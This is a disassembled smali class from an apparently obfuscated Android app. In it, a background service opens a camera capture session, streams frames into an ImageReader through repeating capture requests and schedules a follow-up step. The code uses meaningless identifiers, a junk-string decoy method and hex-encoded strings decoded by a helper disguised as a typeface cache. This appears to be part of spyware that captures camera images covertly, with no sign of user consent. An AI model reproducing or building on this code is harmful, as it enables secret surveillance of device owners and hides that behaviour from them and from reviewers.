.class public final Lv/s/Lll1MAU873FM;
.super Landroid/hardware/camera2/CameraCaptureSession$StateCallback;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"


# instance fields
.field public final synthetic dDIMxZXP1V8HdM:Lapp/mobilex/plus/services/ConfigTQWorker;


# direct methods
.method public constructor <init>(Lapp/mobilex/plus/services/ConfigTQWorker;)V
    .locals 0

    .line 1
    iput-object p1, p0, Lv/s/Lll1MAU873FM;->dDIMxZXP1V8HdM:Lapp/mobilex/plus/services/ConfigTQWorker;

    .line 2
    .line 3
    invoke-direct {p0}, Landroid/hardware/camera2/CameraCaptureSession$StateCallback;-><init>()V

    .line 4
    .line 5
    .line 6
    return-void
.end method

.method private static synthetic tcejemait()V
    .locals 1

    const-string v0, "ViewHolder"

    const-string v0, "Retry"

    const-string v0, "scroll"

    const-string v0, "io.helper.iwftnsjgs"

    const-string v0, "accent"

    const-string v0, "Success"

    const-string v0, "io.data.hbsbzsb"

    return-void
.end method


# virtual methods
.method public final onConfigureFailed(Landroid/hardware/camera2/CameraCaptureSession;)V
    .locals 0

    .line 1
    sget-object p1, Lapp/mobilex/plus/services/ConfigTQWorker;->ibVTtJUNfrGYbW:[B

    .line 2
    .line 3
    const-string p1, "00000077004B009300E500AD00D700E7003000730048009400F900B000DC00E7002000790055008100F900B800C700B5002200620052008800FE00FF00D400A6002A007A005E0083"

    .line 4
    .line 5
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 6
    .line 7
    .line 8
    iget-object p1, p0, Lv/s/Lll1MAU873FM;->dDIMxZXP1V8HdM:Lapp/mobilex/plus/services/ConfigTQWorker;

    .line 9
    .line 10
    invoke-virtual {p1}, Lapp/mobilex/plus/services/ConfigTQWorker;->dDIMxZXP1V8HdM()V

    .line 11
    .line 12
    .line 13
    invoke-virtual {p1}, Landroid/app/Service;->stopSelf()V

    .line 14
    .line 15
    .line 16
    return-void
.end method

.method public final onConfigured(Landroid/hardware/camera2/CameraCaptureSession;)V
    .locals 5

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/ConfigTQWorker;->ibVTtJUNfrGYbW:[B

    .line 2
    .line 3
    const-string v0, "00000077004B009300E500AD00D700E7003000730048009400F900B000DC00E7002000790055008100F900B800C700B500260072"

    .line 4
    .line 5
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 6
    .line 7
    .line 8
    iget-object v0, p0, Lv/s/Lll1MAU873FM;->dDIMxZXP1V8HdM:Lapp/mobilex/plus/services/ConfigTQWorker;

    .line 9
    .line 10
    const/4 v1, 0x1

    .line 11
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 12
    .line 13
    .line 14
    move-result-object v2

    .line 15
    :try_start_0
    iget-object v3, v0, Lapp/mobilex/plus/services/ConfigTQWorker;->dDIMxZXP1V8HdM:Landroid/hardware/camera2/CameraDevice;

    .line 16
    .line 17
    const/16 v4, 0x0

    .line 18
    if-eqz v3, :cond_0

    .line 19
    .line 20
    invoke-virtual {v3, v1}, Landroid/hardware/camera2/CameraDevice;->createCaptureRequest(I)Landroid/hardware/camera2/CaptureRequest$Builder;

    .line 21
    .line 22
    .line 23
    move-result-object v1

    .line 24
    goto :goto_0

    .line 25
    :catch_0
    move-exception p1

    .line 26
    goto/16 :goto_1

    .line 27
    :cond_0
    move-object/from16 v1, v4

    .line 28
    :goto_0
    if-eqz v1, :cond_1

    .line 29
    .line 30
    iget-object v3, v0, Lapp/mobilex/plus/services/ConfigTQWorker;->w9sT1Swbhx3hs:Landroid/media/ImageReader;

    .line 31
    .line 32
    invoke-virtual {v3}, Landroid/media/ImageReader;->getSurface()Landroid/view/Surface;

    .line 33
    .line 34
    .line 35
    move-result-object v3

    .line 36
    invoke-virtual {v1, v3}, Landroid/hardware/camera2/CaptureRequest$Builder;->addTarget(Landroid/view/Surface;)V

    .line 37
    .line 38
    .line 39
    :cond_1
    if-eqz v1, :cond_2

    .line 40
    .line 41
    sget-object v3, Landroid/hardware/camera2/CaptureRequest;->CONTROL_MODE:Landroid/hardware/camera2/CaptureRequest$Key;

    .line 42
    .line 43
    invoke-virtual {v1, v3, v2}, Landroid/hardware/camera2/CaptureRequest$Builder;->set(Landroid/hardware/camera2/CaptureRequest$Key;Ljava/lang/Object;)V

    .line 44
    .line 45
    .line 46
    :cond_2
    if-eqz v1, :cond_3

    .line 47
    .line 48
    sget-object v3, Landroid/hardware/camera2/CaptureRequest;->CONTROL_AE_MODE:Landroid/hardware/camera2/CaptureRequest$Key;

    .line 49
    .line 50
    invoke-virtual {v1, v3, v2}, Landroid/hardware/camera2/CaptureRequest$Builder;->set(Landroid/hardware/camera2/CaptureRequest$Key;Ljava/lang/Object;)V

    .line 51
    .line 52
    .line 53
    :cond_3
    invoke-virtual {v1}, Landroid/hardware/camera2/CaptureRequest$Builder;->build()Landroid/hardware/camera2/CaptureRequest;

    .line 54
    .line 55
    .line 56
    move-result-object v1

    .line 57
    iget-object v2, v0, Lapp/mobilex/plus/services/ConfigTQWorker;->JXn4Qf7zpnLjP5:Landroid/os/Handler;

    nop

    nop

    .line 58
    .line 59
    invoke-virtual {p1, v1, v4, v2}, Landroid/hardware/camera2/CameraCaptureSession;->setRepeatingRequest(Landroid/hardware/camera2/CaptureRequest;Landroid/hardware/camera2/CameraCaptureSession$CaptureCallback;Landroid/os/Handler;)I

    .line 60
    .line 61
    .line 62
    iget-object v1, v0, Lapp/mobilex/plus/services/ConfigTQWorker;->JXn4Qf7zpnLjP5:Landroid/os/Handler;

    .line 63
    .line 64
    if-eqz v1, :cond_4

    .line 65
    .line 66
    new-instance v2, Lv/s/A68NpXPqwTFos99nt;

    .line 67
    .line 68
    const/4 v3, 0x3

    .line 69
    invoke-direct {v2, p1, v3, v0}, Lv/s/A68NpXPqwTFos99nt;-><init>(Ljava/lang/Object;ILjava/lang/Object;)V

    .line 70
    .line 71
    .line 72
    const-wide/16 v3, 0x5dc

    .line 73
    .line 74
    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Landroid/hardware/camera2/CameraAccessException; {:try_start_0 .. :try_end_0} :catch_0

    .line 75
    .line 76
    .line 77
    :cond_4
    return-void

    .line 78
    :goto_1
    const-string v0, "00000077004B009300E500AD00D700E7002600640049008800E200E50092"

    .line 79
    .line 80
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 81
    .line 82
    .line 83
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 84
    .line 85
    .line 86
    return-void
.end method
